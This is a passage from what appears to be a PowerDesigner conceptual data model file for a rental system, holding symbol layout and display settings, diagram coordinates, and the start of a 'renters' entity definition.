TRUE\\&amp;amp;quot;&amp;amp;quot;\\r\\n识别属性 CDMPENTIDTF &amp;amp;quot;\\&amp;amp;quot;AIDF \\&amp;amp;quot;TRUE\\&amp;amp;quot; TRUE\\&amp;amp;quot;&amp;amp;quot;&amp;quot; HasLimit=&amp;quot;Yes&amp;quot; HideEmpty=&amp;quot;No&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardCollection Name=&amp;quot;Identifiers&amp;quot; Collection=&amp;quot;Identifiers&amp;quot; Columns=&amp;quot;Stereotype No\\r\\nDisplayName Yes\\r\\nIdentifierIndicator No 标识符指标&amp;quot; HasLimit=&amp;quot;No&amp;quot; HideEmpty=&amp;quot;No&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Comment&amp;quot; Attribute=&amp;quot;Comment&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;LEFT&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Icon&amp;quot; Attribute=&amp;quot;IconPicture&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;Yes&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;强制顶部对齐&amp;quot; Attribute=&amp;quot;TextStyle&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;Yes&amp;quot; /&amp;gt;[CRLF]&amp;lt;/Form&amp;gt;Relationship.Entity1ToEntity2Role=YesRelationship.Entity2ToEntity1RoleCardinality=NoRelationship.Entity1ToEntity2RoleDominant=YesRelationship.Stereotype=YesRelationship.DisplayName=YesRelationship.Entity2ToEntity1Role=YesRelationship.Entity1ToEntity2RoleCardinality=NoRelationship.Entity2ToEntity1RoleDominant=YesRelationship_SymbolLayout=&amp;lt;Form&amp;gt;[CRLF] &amp;lt;Form Name=&amp;quot;源&amp;quot; &amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Role&amp;quot; Attribute=&amp;quot;Entity1ToEntity2Role&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;Role&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Cardinality&amp;quot; Attribute=&amp;quot;Entity2ToEntity1RoleCardinality&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;Cardinality&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Dominance&amp;quot; Attribute=&amp;quot;Entity1ToEntity2RoleDominant&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;Dominance&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;/Form&amp;gt;[CRLF] &amp;lt;Form Name=&amp;quot;居中&amp;quot; &amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;构造型&amp;quot; Attribute=&amp;quot;Stereotype&amp;quot; Prefix=&amp;quot;&amp;amp;lt;&amp;amp;lt;&amp;quot; Suffix=&amp;quot;&amp;amp;gt;&amp;amp;gt;&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;名称&amp;quot; Attribute=&amp;quot;DisplayName&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;/Form&amp;gt;[CRLF] &amp;lt;Form Name=&amp;quot;Destination&amp;quot; &amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Role&amp;quot; Attribute=&amp;quot;Entity2ToEntity1Role&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;Role&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Cardinality&amp;quot; Attribute=&amp;quot;Entity1ToEntity2RoleCardinality&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;Cardinality&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Dominance&amp;quot; Attribute=&amp;quot;Entity2ToEntity1RoleDominant&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;Dominance&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;/Form&amp;gt;[CRLF]&amp;lt;/Form&amp;gt;Association.Stereotype=YesAssociation.Comment=NoAssociation.Attributes=YesAssociation.Attributes._Columns=Stereotype DomainOrDataType NullIndicatorAssociation.Attributes._Limit=-5Association.IconPicture=NoAssociation.TextStyle=NoAssociation_SymbolLayout=&amp;lt;Form&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;构造型&amp;quot; Attribute=&amp;quot;Stereotype&amp;quot; Prefix=&amp;quot;&amp;amp;lt;&amp;amp;lt;&amp;quot; Suffix=&amp;quot;&amp;amp;gt;&amp;amp;gt;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;名称&amp;quot; Attribute=&amp;quot;DisplayName&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;Yes&amp;quot; /&amp;gt;[CRLF] &amp;lt;Separator Name=&amp;quot;Separator&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Comment&amp;quot; Attribute=&amp;quot;Comment&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;LEFT&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardCollection Name=&amp;quot;Attributes&amp;quot; Collection=&amp;quot;Attributes&amp;quot; Columns=&amp;quot;Stereotype No\\r\\nDisplayName Yes\\r\\nDataType No\\r\\nDomainOrDataType No 域或数据类型\\r\\nDomain No\\r\\nNullIndicator No 强制性&amp;quot; HasLimit=&amp;quot;Yes&amp;quot; HideEmpty=&amp;quot;No&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Icon&amp;quot; Attribute=&amp;quot;IconPicture&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;Yes&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;强制顶部对齐&amp;quot; Attribute=&amp;quot;TextStyle&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;Yes&amp;quot; /&amp;gt;[CRLF]&amp;lt;/Form&amp;gt;AssociationLink.SymbolCardinality=YesAssociationLink.Stereotype=YesAssociationLink.Role=YesAssociationLink_SymbolLayout=&amp;lt;Form&amp;gt;[CRLF] &amp;lt;Form Name=&amp;quot;源&amp;quot; &amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Cardinality&amp;quot; Attribute=&amp;quot;SymbolCardinality&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;Cardinality&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;/Form&amp;gt;[CRLF] &amp;lt;Form Name=&amp;quot;居中&amp;quot; &amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;构造型&amp;quot; Attribute=&amp;quot;Stereotype&amp;quot; Prefix=&amp;quot;&amp;amp;lt;&amp;amp;lt;&amp;quot; Suffix=&amp;quot;&amp;amp;gt;&amp;amp;gt;&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Role&amp;quot; Attribute=&amp;quot;Role&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;/Form&amp;gt;[CRLF] &amp;lt;Form Name=&amp;quot;Destination&amp;quot; &amp;gt;[CRLF] &amp;lt;/Form&amp;gt;[CRLF]&amp;lt;/Form&amp;gt;Inheritance.Stereotype=YesInheritance.DisplayName=YesInheritance.IconPicture=NoInheritance.TextStyle=NoInheritance_SymbolLayout=&amp;lt;Form&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;构造型&amp;quot; Attribute=&amp;quot;Stereotype&amp;quot; Prefix=&amp;quot;&amp;amp;lt;&amp;amp;lt;&amp;quot; Suffix=&amp;quot;&amp;amp;gt;&amp;amp;gt;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;名称&amp;quot; Attribute=&amp;quot;DisplayName&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;Separator Name=&amp;quot;Separator&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Icon&amp;quot; Attribute=&amp;quot;IconPicture&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;Yes&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;强制顶部对齐&amp;quot; Attribute=&amp;quot;TextStyle&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;Yes&amp;quot; /&amp;gt;[CRLF]&amp;lt;/Form&amp;gt;[DisplayPreferences\\Symbol][DisplayPreferences\\Symbol\\FRMEOBJ]STRNFont=Arial,8,NSTRNFont color=0 0 0DISPNAMEFont=Arial,8,NDISPNAMEFont color=0 0 0LABLFont=Arial,8,NLABLFont color=0 0 0AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoWidth=6000Height=2000Brush color=255 255 255Fill Color=YesBrush style=6Brush bitmap mode=12Brush gradient mode=64Brush gradient color=192 192 192Brush background image=Custom shape=Custom text mode=0Pen=1 0 255 128 128Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\FRMELNK]CENTERFont=Arial,8,NCENTERFont color=0 0 0Line style=2AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoBrush color=255 255 255Fill Color=YesBrush style=1Brush bitmap mode=12Brush gradient mode=0Brush gradient color=118 118 118Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 128 255Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\USRDEPD]CENTERFont=新宋体,8,NCENTERFont color=0 0 0Line style=2AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoBrush color=255 255 255Fill Color=YesBrush style=1Brush bitmap mode=12Brush gradient mode=0Brush gradient color=118 118 118Brush background image=Custom shape=Custom text mode=0Pen=2 0 128 0 64Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\FILO]OBJSTRNFont=新宋体,8,NOBJSTRNFont color=0 0 0DISPNAMEFont=新宋体,8,NDISPNAMEFont color=0 0 0LCNMFont=新宋体,8,NLCNMFont color=0 0 0AutoAdjustToText=YesKeep aspect=YesKeep center=YesKeep size=NoWidth=2400Height=2400Brush color=255 255 255Fill Color=NoBrush style=1Brush bitmap mode=12Brush gradient mode=0Brush gradient color=118 118 118Brush background image=Custom shape=Custom text mode=0Pen=1 0 0 0 255Shadow color=192 192 192Shadow=-1[DisplayPreferences\\Symbol\\CDMPCKG]STRNFont=Arial,8,NSTRNFont color=0 0 0DISPNAMEFont=Arial,8,NDISPNAMEFont color=0 0 0LABLFont=Arial,8,NLABLFont color=0 0 0AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoWidth=4800Height=3600Brush color=255 255 192Fill Color=YesBrush style=6Brush bitmap mode=12Brush gradient mode=65Brush gradient color=255 255 255Brush background image=Custom shape=Custom text mode=0Pen=1 0 178 178 178Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\ENTT]STRNFont=Arial,8,NSTRNFont color=0 0 0DISPNAMEFont=Arial,8,NDISPNAMEFont color=0 0 0AttributesFont=Arial,8,NAttributesFont color=0 0 0EntityPrimaryAttributeFont=Arial,8,UEntityPrimaryAttributeFont color=0 0 0IdentifiersFont=Arial,8,NIdentifiersFont color=0 0 0LABLFont=Arial,8,NLABLFont color=0 0 0AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoWidth=4800Height=4000Brush color=233 202 131Fill Color=YesBrush style=6Brush bitmap mode=12Brush gradient mode=65Brush gradient color=255 255 255Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 128 64Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\RLSH]SOURCEFont=新宋体,8,NSOURCEFont color=0 0 0CENTERFont=新宋体,8,NCENTERFont color=0 0 0DESTINATIONFont=新宋体,8,NDESTINATIONFont color=0 0 0Line style=2AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoBrush color=255 255 255Fill Color=YesBrush style=1Brush bitmap mode=12Brush gradient mode=0Brush gradient color=118 118 118Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 0 64Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\ASSC]STRNFont=Arial,8,NSTRNFont color=0 0 0DISPNAMEFont=Arial,8,NDISPNAMEFont color=0 0 0LABLFont=Arial,8,NLABLFont color=0 0 0AttributesFont=Arial,8,NAttributesFont color=0 0 0EntityPrimaryAttributeFont=新宋体,8,UEntityPrimaryAttributeFont color=0 0 0AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoWidth=4800Height=3000Brush color=208 208 255Fill Color=YesBrush style=6Brush bitmap mode=12Brush gradient mode=65Brush gradient color=255 255 255Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 128 255Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\LINK]SOURCEFont=新宋体,8,NSOURCEFont color=0 0 0CENTERFont=新宋体,8,NCENTERFont color=0 0 0Line style=2AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoBrush color=255 255 255Fill Color=YesBrush style=1Brush bitmap mode=12Brush gradient mode=0Brush gradient color=118 118 118Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 128 255Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\CDMINHR]STRNFont=新宋体,8,NSTRNFont color=0 0 0DISPNAMEFont=Arial,8,NDISPNAMEFont color=0 0 0AutoAdjustToText=NoKeep aspect=NoKeep center=NoKeep size=YesWidth=1575Height=1000Brush color=233 202 131Fill Color=YesBrush style=6Brush bitmap mode=12Brush gradient mode=65Brush gradient color=255 255 255Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 0 0Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\LINH]CENTERFont=新宋体,8,NCENTERFont color=0 0 0Line style=2AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoBrush color=255 255 255Fill Color=YesBrush style=1Brush bitmap mode=12Brush gradient mode=0Brush gradient color=118 118 118Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 0 0Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\Free Symbol]Free TextFont=Arial,8,NFree TextFont color=0 0 0Line style=2AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoBrush color=255 255 255Fill Color=YesBrush style=1Brush bitmap mode=12Brush gradient mode=0Brush gradient color=118 118 118Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 0 0Shadow color=192 192 192Shadow=0&lt;/a:DisplayPreferences&gt;&lt;a:PaperSize&gt;(8268, 11693)&lt;/a:PaperSize&gt;&lt;a:PageMargins&gt;((315,354), (433,354))&lt;/a:PageMargins&gt;&lt;a:PageOrientation&gt;1&lt;/a:PageOrientation&gt;&lt;a:PaperSource&gt;15&lt;/a:PaperSource&gt;&lt;c:Symbols&gt;&lt;o:RelationshipSymbol Id=&quot;o5&quot;&gt;&lt;a:CreationDate&gt;1618322546&lt;/a:CreationDate&gt;&lt;a:ModificationDate&gt;1618324592&lt;/a:ModificationDate&gt;&lt;a:Rect&gt;((-30340,-19936), (-2717,-1176))&lt;/a:Rect&gt;&lt;a:ListOfPoints&gt;((-4117,-18736),(-29080,-18736),(-29080,-1576))&lt;/a:ListOfPoints&gt;&lt;a:CornerStyle&gt;2&lt;/a:CornerStyle&gt;&lt;a:ArrowStyle&gt;4882&lt;/a:ArrowStyle&gt;&lt;a:LineColor&gt;4194432&lt;/a:LineColor&gt;&lt;a:ShadowColor&gt;12632256&lt;/a:ShadowColor&gt;&lt;a:FontList&gt;CENTER 0 新宋体,8,NSOURCE 0 新宋体,8,NDESTINATION 0 新宋体,8,N&lt;/a:FontList&gt;&lt;a:AutomaticRoutingState&gt;3&lt;/a:AutomaticRoutingState&gt;&lt;c:SourceSymbol&gt;&lt;o:EntitySymbol Ref=&quot;o6&quot;/&gt;&lt;/c:SourceSymbol&gt;&lt;c:DestinationSymbol&gt;&lt;o:EntitySymbol Ref=&quot;o7&quot;/&gt;&lt;/c:DestinationSymbol&gt;&lt;c:Object&gt;&lt;o:Relationship Ref=&quot;o8&quot;/&gt;&lt;/c:Object&gt;&lt;/o:RelationshipSymbol&gt;&lt;o:RelationshipSymbol Id=&quot;o9&quot;&gt;&lt;a:CreationDate&gt;1618322755&lt;/a:CreationDate&gt;&lt;a:ModificationDate&gt;1618322933&lt;/a:ModificationDate&gt;&lt;a:Rect&gt;((1643,-16808), (4163,-4471))&lt;/a:Rect&gt;&lt;a:ListOfPoints&gt;((2903,-4871),(2893,-15407))&lt;/a:ListOfPoints&gt;&lt;a:CornerStyle&gt;2&lt;/a:CornerStyle&gt;&lt;a:ArrowStyle&gt;4627&lt;/a:ArrowStyle&gt;&lt;a:LineColor&gt;4194432&lt;/a:LineColor&gt;&lt;a:ShadowColor&gt;12632256&lt;/a:ShadowColor&gt;&lt;a:FontList&gt;CENTER 0 新宋体,8,NSOURCE 0 新宋体,8,NDESTINATION 0 新宋体,8,N&lt;/a:FontList&gt;&lt;c:SourceSymbol&gt;&lt;o:EntitySymbol Ref=&quot;o10&quot;/&gt;&lt;/c:SourceSymbol&gt;&lt;c:DestinationSymbol&gt;&lt;o:EntitySymbol Ref=&quot;o6&quot;/&gt;&lt;/c:DestinationSymbol&gt;&lt;c:Object&gt;&lt;o:Relationship Ref=&quot;o11&quot;/&gt;&lt;/c:Object&gt;&lt;/o:RelationshipSymbol&gt;&lt;o:RelationshipSymbol Id=&quot;o12&quot;&gt;&lt;a:CreationDate&gt;1618322762&lt;/a:CreationDate&gt;&lt;a:ModificationDate&gt;1618322762&lt;/a:ModificationDate&gt;&lt;a:Rect&gt;((10790,-2262), (21347,138))&lt;/a:Rect&gt;&lt;a:ListOfPoints&gt;((20947,-1062),(12190,-1062))&lt;/a:ListOfPoints&gt;&lt;a:CornerStyle&gt;2&lt;/a:CornerStyle&gt;&lt;a:ArrowStyle&gt;4627&lt;/a:ArrowStyle&gt;&lt;a:LineColor&gt;4194432&lt;/a:LineColor&gt;&lt;a:ShadowColor&gt;12632256&lt;/a:ShadowColor&gt;&lt;a:FontList&gt;CENTER 0 新宋体,8,NSOURCE 0 新宋体,8,NDESTINATION 0 新宋体,8,N&lt;/a:FontList&gt;&lt;c:SourceSymbol&gt;&lt;o:EntitySymbol Ref=&quot;o13&quot;/&gt;&lt;/c:SourceSymbol&gt;&lt;c:DestinationSymbol&gt;&lt;o:EntitySymbol Ref=&quot;o10&quot;/&gt;&lt;/c:DestinationSymbol&gt;&lt;c:Object&gt;&lt;o:Relationship Ref=&quot;o14&quot;/&gt;&lt;/c:Object&gt;&lt;/o:RelationshipSymbol&gt;&lt;o:RelationshipSymbol Id=&quot;o15&quot;&gt;&lt;a:CreationDate&gt;1618323460&lt;/a:CreationDate&gt;&lt;a:ModificationDate&gt;1618324592&lt;/a:ModificationDate&gt;&lt;a:Rect&gt;((-21750,-2262), (-6410,138))&lt;/a:Rect&gt;&lt;a:ListOfPoints&gt;((-20350,-1062),(-7810,-1062))&lt;/a:ListOfPoints&gt;&lt;a:CornerStyle&gt;2&lt;/a:CornerStyle&gt;&lt;a:ArrowStyle&gt;4883&lt;/a:ArrowStyle&gt;&lt;a:LineColor&gt;4194432&lt;/a:LineColor&gt;&lt;a:ShadowColor&gt;12632256&lt;/a:ShadowColor&gt;&lt;a:FontList&gt;CENTER 0 新宋体,8,NSOURCE 0 新宋体,8,NDESTINATION 0 新宋体,8,N&lt;/a:FontList&gt;&lt;c:SourceSymbol&gt;&lt;o:EntitySymbol Ref=&quot;o7&quot;/&gt;&lt;/c:SourceSymbol&gt;&lt;c:DestinationSymbol&gt;&lt;o:EntitySymbol Ref=&quot;o10&quot;/&gt;&lt;/c:DestinationSymbol&gt;&lt;c:Object&gt;&lt;o:Relationship Ref=&quot;o16&quot;/&gt;&lt;/c:Object&gt;&lt;/o:RelationshipSymbol&gt;&lt;o:EntitySymbol Id=&quot;o7&quot;&gt;&lt;a:CreationDate&gt;1618315086&lt;/a:CreationDate&gt;&lt;a:ModificationDate&gt;1618324888&lt;/a:ModificationDate&gt;&lt;a:IconMode&gt;-1&lt;/a:IconMode&gt;&lt;a:Rect&gt;((-38374,-4136), (-20350,1562))&lt;/a:Rect&gt;&lt;a:LineColor&gt;4227200&lt;/a:LineColor&gt;&lt;a:FillColor&gt;8637161&lt;/a:FillColor&gt;&lt;a:ShadowColor&gt;12632256&lt;/a:ShadowColor&gt;&lt;a:FontList&gt;STRN 0 Arial,8,NDISPNAME 0 Arial,8,NAttributes 0 Arial,8,NEntityPrimaryAttribute 0 Arial,8,UIdentifiers 0 Arial,8,NLABL 0 Arial,8,N&lt;/a:FontList&gt;&lt;a:BrushStyle&gt;6&lt;/a:BrushStyle&gt;&lt;a:GradientFillMode&gt;65&lt;/a:GradientFillMode&gt;&lt;a:GradientEndColor&gt;16777215&lt;/a:GradientEndColor&gt;&lt;c:Object&gt;&lt;o:Entity Ref=&quot;o17&quot;/&gt;&lt;/c:Object&gt;&lt;/o:EntitySymbol&gt;&lt;o:EntitySymbol Id=&quot;o10&quot;&gt;&lt;a:CreationDate&gt;1618315087&lt;/a:CreationDate&gt;&lt;a:ModificationDate&gt;1618324888&lt;/a:ModificationDate&gt;&lt;a:IconMode&gt;-1&lt;/a:IconMode&gt;&lt;a:Rect&gt;((-7810,-4871), (12190,2747))&lt;/a:Rect&gt;&lt;a:LineColor&gt;4227200&lt;/a:LineColor&gt;&lt;a:FillColor&gt;8637161&lt;/a:FillColor&gt;&lt;a:ShadowColor&gt;12632256&lt;/a:ShadowColor&gt;&lt;a:FontList&gt;STRN 0 Arial,8,NDISPNAME 0 Arial,8,NAttributes 0 Arial,8,NEntityPrimaryAttribute 0 Arial,8,UIdentifiers 0 Arial,8,NLABL 0 Arial,8,N&lt;/a:FontList&gt;&lt;a:BrushStyle&gt;6&lt;/a:BrushStyle&gt;&lt;a:GradientFillMode&gt;65&lt;/a:GradientFillMode&gt;&lt;a:GradientEndColor&gt;16777215&lt;/a:GradientEndColor&gt;&lt;c:Object&gt;&lt;o:Entity Ref=&quot;o18&quot;/&gt;&lt;/c:Object&gt;&lt;/o:EntitySymbol&gt;&lt;o:EntitySymbol Id=&quot;o13&quot;&gt;&lt;a:CreationDate&gt;1618319539&lt;/a:CreationDate&gt;&lt;a:ModificationDate&gt;1618324888&lt;/a:ModificationDate&gt;&lt;a:IconMode&gt;-1&lt;/a:IconMode&gt;&lt;a:Rect&gt;((20947,-3881), (40947,1817))&lt;/a:Rect&gt;&lt;a:LineColor&gt;4227200&lt;/a:LineColor&gt;&lt;a:FillColor&gt;8637161&lt;/a:FillColor&gt;&lt;a:ShadowColor&gt;12632256&lt;/a:ShadowColor&gt;&lt;a:FontList&gt;STRN 0 Arial,8,NDISPNAME 0 Arial,8,NAttributes 0 Arial,8,NEntityPrimaryAttribute 0 Arial,8,UIdentifiers 0 Arial,8,NLABL 0 Arial,8,N&lt;/a:FontList&gt;&lt;a:BrushStyle&gt;6&lt;/a:BrushStyle&gt;&lt;a:GradientFillMode&gt;65&lt;/a:GradientFillMode&gt;&lt;a:GradientEndColor&gt;16777215&lt;/a:GradientEndColor&gt;&lt;c:Object&gt;&lt;o:Entity Ref=&quot;o19&quot;/&gt;&lt;/c:Object&gt;&lt;/o:EntitySymbol&gt;&lt;o:EntitySymbol Id=&quot;o6&quot;&gt;&lt;a:CreationDate&gt;1618322365&lt;/a:CreationDate&gt;&lt;a:ModificationDate&gt;1618324888&lt;/a:ModificationDate&gt;&lt;a:IconMode&gt;-1&lt;/a:IconMode&gt;&lt;a:Rect&gt;((-4117,-22065), (9767,-15407))&lt;/a:Rect&gt;&lt;a:LineColor&gt;4227200&lt;/a:LineColor&gt;&lt;a:FillColor&gt;8637161&lt;/a:FillColor&gt;&lt;a:ShadowColor&gt;12632256&lt;/a:ShadowColor&gt;&lt;a:FontList&gt;STRN 0 Arial,8,NDISPNAME 0 Arial,8,NAttributes 0 Arial,8,NEntityPrimaryAttribute 0 Arial,8,UIdentifiers 0 Arial,8,NLABL 0 Arial,8,N&lt;/a:FontList&gt;&lt;a:BrushStyle&gt;6&lt;/a:BrushStyle&gt;&lt;a:GradientFillMode&gt;65&lt;/a:GradientFillMode&gt;&lt;a:GradientEndColor&gt;16777215&lt;/a:GradientEndColor&gt;&lt;c:Object&gt;&lt;o:Entity Ref=&quot;o20&quot;/&gt;&lt;/c:Object&gt;&lt;/o:EntitySymbol&gt;&lt;/c:Symbols&gt;&lt;/o:ConceptualDiagram&gt;&lt;/c:ConceptualDiagrams&gt;&lt;c:DefaultDiagram&gt;&lt;o:ConceptualDiagram Ref=&quot;o4&quot;/&gt;&lt;/c:DefaultDiagram&gt;&lt;c:Entities&gt;&lt;o:Entity Id=&quot;o17&quot;&gt;&lt;a:ObjectID&gt;40F6E014-B48E-4682-AC15-11718F891E8F&lt;/a:ObjectID&gt;&lt;a:Name&gt;租客&lt;/a:Name&gt;&lt;a:Code&gt;renters&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618315086&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618323511&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;c:Identifiers&gt;&lt;o:Identifier Id=&quot;o21&quot;&gt;&lt;a:ObjectID&gt;F965A0EE-B3E3-438F-A5E6-1538D2E7B693&lt;/a:ObjectID&gt;&lt;a:Name&gt;Identifier_1&lt;/a:Name&gt;&lt;a:Code&gt;Identifier_1&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618315235&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618315463&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;c:Identifier.Attributes&gt;&lt;o:EntityAttribute Ref=&quot;o22&quot;/&gt;&lt;/c:Identifier.Attributes&gt;&lt;/o:Identifier&gt;&lt;/c:Identifiers&gt;&lt;c:PrimaryIdentifier&gt;&lt;o:Identifier Ref=&quot;o21&quot;/&gt;&lt;/c:PrimaryIdentifier&gt;&lt;c:Attributes&gt;&lt;o:EntityAttribute Id=&quot;o22&quot;&gt;&lt;a:ObjectID&gt;4AFE59F8-46B5-4D94-9E36-D1C0C6A93550&lt;/a:ObjectID&gt;&lt;a:CreationDate&gt;1618315089&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618315463&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:BaseAttribute.Mandatory&gt;1&lt;/a:BaseAttribute.Mandatory&gt;&lt;c:DataItem&gt;&lt;o:DataItem 